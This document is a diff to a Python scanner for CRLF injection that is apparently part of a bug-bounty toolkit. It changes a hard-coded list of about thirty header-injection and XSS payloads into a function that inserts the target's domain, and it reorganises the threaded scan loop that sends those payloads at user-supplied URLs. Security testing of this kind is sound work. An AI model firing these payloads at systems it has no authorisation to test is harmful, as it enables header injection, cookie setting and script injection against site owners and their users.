@@ -121,7 +121,7 @@ try:
         ]
         
         for option in options:
-            print(border_color + "│" + option_color + option.ljust(59) + border_color + "│")
+            print(border_color + "│" + option_color + option.ljust(61) + border_color + "│")
         
         print(border_color + "└" + "─" * 61 + "┘")
         authors = "Created by: Coffinxp, 1hehaq, HexSh1dow, Naho, AnonKryptiQuz"
@@ -1645,42 +1645,51 @@ try:
         from urllib3.util.retry import Retry
         from prompt_toolkit import prompt
         from prompt_toolkit.completion import PathCompleter
+        from urllib.parse import urlparse
         init(autoreset=True)
 
         urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-        PAYLOADS = [
-            "/%%0a0aSet-Cookie:loxs=injected",
-            "/%0aSet-Cookie:loxs=injected;",
-            "/%0aSet-Cookie:loxs=injected",
-            "/%0d%0aLocation: http://loxs.pages.dev",
-            "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23",
-            "/%0d%0a%0d%0a<script>alert('LOXS')</script>;",
-            "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e",
-            "/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('LOXS');</script>",
-            "/%0d%0aHost: {{Hostname}}%0d%0aCookie: loxs=injected%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: loxs=injected%0d%0a%0d%0a",
-            "/%0d%0aLocation: loxs.pages.dev",
-            "/%0d%0aSet-Cookie:loxs=injected;",
-            "/%0aSet-Cookie:loxs=injected",
-            "/%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<svg/onload=alert(document.domain)>",
-            "/%23%0aSet-Cookie:loxs=injected",
-            "/%25%30%61Set-Cookie:loxs=injected",
-            "/%2e%2e%2f%0d%0aSet-Cookie:loxs=injected",
-            "/%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a<script>alert(document.cookie)</script>%2F../%2F..%2F..%2F..%2F../tr",
-            "/%3f%0d%0aLocation:%0d%0aloxs-x:loxs-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>",
-            "/%5Cr%20Set-Cookie:loxs=injected;",
-            "/%5Cr%5Cn%20Set-Cookie:loxs=injected;",
-            "/%5Cr%5Cn%5CtSet-Cookie:loxs%5Cr%5CtSet-Cookie:loxs=injected;",
-            "/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:loxs=injected;",
-            "/%E5%98%8A%E5%98%8DLocation:loxs.pages.dev",
-            "/%E5%98%8D%E5%98%8ALocation:loxs.pages.dev",
-            "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
-            "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected;",
-            "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
-            "/%u000ASet-Cookie:loxs=injected;",
-            "/loxs.pages.dev/%2E%2E%2F%0D%0Aloxs-x:loxs-x",
-            "/loxs.pages.dev/%2F..%0D%0Aloxs-x:loxs-x"
-        ]
+        def get_domain(url):
+            parsed_url = urlparse(url)
+            return parsed_url.netloc
+
+        def generate_payloads(url):
+            domain = get_domain(url)
+            base_payloads = [
+                "/%%0a0aSet-Cookie:loxs=injected",
+                "/%0aSet-Cookie:loxs=injected;",
+                "/%0aSet-Cookie:loxs=injected",
+                "/%0d%0aLocation: http://loxs.pages.dev",
+                "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23",
+                "/%0d%0a%0d%0a<script>alert('LOXS')</script>;",
+                "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e",
+                "/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('LOXS');</script>",
+                "/%0d%0aHost: {{Hostname}}%0d%0aCookie: loxs=injected%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: loxs=injected%0d%0a%0d%0a",
+                "/%0d%0aLocation: loxs.pages.dev",
+                "/%0d%0aSet-Cookie:loxs=injected;",
+                "/%0aSet-Cookie:loxs=injected",
+                "/%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<svg/onload=alert(document.domain)>",
+                "/%23%0aSet-Cookie:loxs=injected",
+                "/%25%30%61Set-Cookie:loxs=injected",
+                "/%2e%2e%2f%0d%0aSet-Cookie:loxs=injected",
+                "/%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a<script>alert(document.cookie)</script>%2F../%2F..%2F..%2F..%2F../tr",
+                "/%3f%0d%0aLocation:%0d%0aloxs-x:loxs-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>",
+                "/%5Cr%20Set-Cookie:loxs=injected;",
+                "/%5Cr%5Cn%20Set-Cookie:loxs=injected;",
+                "/%5Cr%5Cn%5CtSet-Cookie:loxs%5Cr%5CtSet-Cookie:loxs=injected;",
+                "/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:loxs=injected;",
+                "/%E5%98%8A%E5%98%8DLocation:loxs.pages.dev",
+                "/%E5%98%8D%E5%98%8ALocation:loxs.pages.dev",
+                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
+                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected;",
+                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
+                "/%u000ASet-Cookie:loxs=injected;",
+                "/loxs.pages.dev/%2E%2E%2F%0D%0Aloxs-x:loxs-x",
+                "/loxs.pages.dev/%2F..%0D%0Aloxs-x:loxs-x"
+            ]
+            
+            return [payload.replace('{{Hostname}}', domain) for payload in base_payloads]
 
         REGEX_PATTERNS = [
             r'(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)loxs\.pages\.dev\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?loxs=injected(?:\s*?)(?:$|;)))',
@@ -1705,6 +1714,7 @@ try:
             return session
 
         def check_crlf_vulnerability(url, payload):
+            payloads = generate_payloads(url)
             target_url = f"{url}{payload}"
             start_time = time.time()
             
@@ -1758,9 +1768,10 @@ try:
         def test_crlf(url, max_threads=5):
             found_vulnerabilities = 0
             vulnerable_urls = []
+            payloads = generate_payloads(url)
 
             with ThreadPoolExecutor(max_workers=max_threads) as executor:
-                future_to_payload = {executor.submit(check_crlf_vulnerability, url, payload): payload for payload in PAYLOADS}
+                future_to_payload = {executor.submit(check_crlf_vulnerability, url, payload): payload for payload in payloads}
                 for future in as_completed(future_to_payload):
                     payload = future_to_payload[future]
                     try:
@@ -1827,70 +1838,68 @@ try:
                     input(f"{Fore.YELLOW}[i] Press Enter to try again...")
                     clear_screen()
                     print(f"{Fore.GREEN}Welcome to the CRLF Injection Testing Tool!\n")
-        try:
-
-            clear_screen()
-            panel = Panel(
-            r"""
-     __________  __    ______
-    / ____/ __ \/ /   / ____/  ______________ _____  ____  ___  _____
-   / /   / /_/ / /   / /_     / ___/ ___/ __ `/ __ \/ __ \/ _ \/ ___/
-  / /___/ _, _/ /___/ __/    (__  ) /__/ /_/ / / / / / / /  __/ /
-  \____/_/ |_/_____/_/      /____/\___/\__,_/_/ /_/_/ /_/\___/_/
-
-            """,
-            style="bold green",
-            border_style="blue",
-            expand=False
-            )
-            rich_print(panel, "\n")
-
-            print(Fore.GREEN + "Welcome to the CRLF Injection Testing Tool!\n")
-
-            urls = prompt_for_urls()
-            
-            max_threads_input = input("[?] Enter the number of concurrent threads (1-10, press Enter for 5): ").strip()
-            max_threads = int(max_threads_input) if max_threads_input.isdigit() and 1 <= int(max_threads_input) <= 10 else 5
-
-            print(Fore.YELLOW + "\n[i] Loading, Please Wait...")
-            time.sleep(1)
-            clear_screen()
-            print(Fore.CYAN + "[i] Starting scan...\n")
-
-            total_found = 0
-            total_scanned = 0
-            start_time = time.time()
-            vulnerable_urls = []
-
-            if scan_state is None:
-                scan_state = {
-                    'vulnerability_found': False,
-                    'vulnerable_urls': [],
-                    'total_found': 0,
-                    'total_scanned': 0
-                }
-
-            for url in urls:
-                box_content = f" → Scanning URL: {url} "
-                box_width = max(len(box_content) + 2, 40)
-                print(Fore.YELLOW + "\n┌" + "─" * (box_width - 2) + "┐")
-                print(Fore.YELLOW + f"│{box_content.center(box_width - 2)}│")
-                print(Fore.YELLOW + "└" + "─" * (box_width - 2) + "┘\n")
-
-                found, urls_with_payloads = test_crlf(url, max_threads)
-                total_found += found
-                total_scanned += len(PAYLOADS)
-                vulnerable_urls.extend(urls_with_payloads)
-
-            print_scan_summary(total_found, total_scanned, start_time)
-            save_results(vulnerable_urls, total_found, total_scanned, start_time)
-
-        except KeyboardInterrupt:
-            print(Fore.RED + "\n[!] Program interrupted by user.")
-            print_scan_summary(total_found, total_scanned, start_time)
-            sys.exit(0)
-
         
+        clear_screen()
+        panel = Panel(
+        r"""
+   __________  __    ______
+  / ____/ __ \/ /   / ____/  ______________ _____  ____  ___  _____
+ / /   / /_/ / /   / /_     / ___/ ___/ __ `/ __ \/ __ \/ _ \/ ___/
+/ /___/ _, _/ /___/ __/    (__  ) /__/ /_/ / / / / / / /  __/ /
+\____/_/ |_/_____/_/      /____/\___/\__,_/_/ /_/_/ /_/\___/_/
+
+        """,
+        style="bold green",
+        border_style="blue",
+        expand=False
+        )
+        rich_print(panel, "\n")
+
+        print(Fore.GREEN + "Welcome to the CRLF Injection Testing Tool!\n")
+
+        urls = prompt_for_urls()
+        
+        max_threads_input = input("[?] Enter the number of concurrent threads (1-10, press Enter for 5): ").strip()
+        max_threads = int(max_threads_input) if max_threads_input.isdigit() and 1 <= int(max_threads_input) <= 10 else 5
+
+        print(Fore.YELLOW + "\n[i] Loading, Please Wait...")
+        time.sleep(1)
+        clear_screen()
+        print(Fore.CYAN + "[i] Starting scan...\n")
+
+        total_found = 0
+        total_scanned = 0
+        start_time = time.time()
+        vulnerable_urls = []
+
+        if scan_state is None:
+            scan_state = {
+                'vulnerability_found': False,
+                'vulnerable_urls': [],
+                'total_found': 0,
+                'total_scanned': 0
+            }
+
+        for url in urls:
+            box_content = f" → Scanning URL: {url} "
+            box_width = max(len(box_content) + 2, 40)
+            print(Fore.YELLOW + "\n┌" + "─" * (box_width - 2) + "┐")
+            print(Fore.YELLOW + f"│{box_content.center(box_width - 2)}│")
+            print(Fore.YELLOW + "└" + "─" * (box_width - 2) + "┘\n")
+
+            found, urls_with_payloads = test_crlf(url, max_threads)
+            total_found += found
+            total_scanned += len(generate_payloads(url))
+            vulnerable_urls.extend(urls_with_payloads)
+
+        print_scan_summary(total_found, total_scanned, start_time)
+        save_results(vulnerable_urls, total_found, total_scanned, start_time)
+
+        print(Fore.RED + "\nExiting...")
+        os._exit(0)
+        
+        
+    
     def run_update():
         from packaging import version
         import requests
